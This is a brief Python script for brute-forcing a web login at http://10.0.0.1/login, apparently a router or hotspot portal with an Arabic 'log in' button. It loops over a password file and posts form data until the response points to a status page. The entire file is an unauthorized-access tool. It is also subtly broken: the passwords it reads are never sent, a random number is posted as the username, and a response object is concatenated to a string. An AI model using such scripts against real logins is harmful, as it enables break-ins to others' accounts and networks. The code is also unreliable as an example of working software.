import requests
import random
def bruteforce(username,url):
   for password in passwords:
      password = password.strip()
      x=random.randint(100000000,1000000000)
      print(x)
      data_dictionary = {'username':x ,'submit':'تسجيل الدخول'}
      resp = requests.post(url, data_dictionary)
      x = requests.get(url)
      t = resp.text
      
      if  "http://10.0.0.1/status" in str(resp.text):
          print("username is : "+ x)
          exit()
      else:
          
          pass
          
url='http://10.0.0.1/login'
username= 'admin'
with open('pass.txt','r') as passwords:
    bruteforce(username, url)
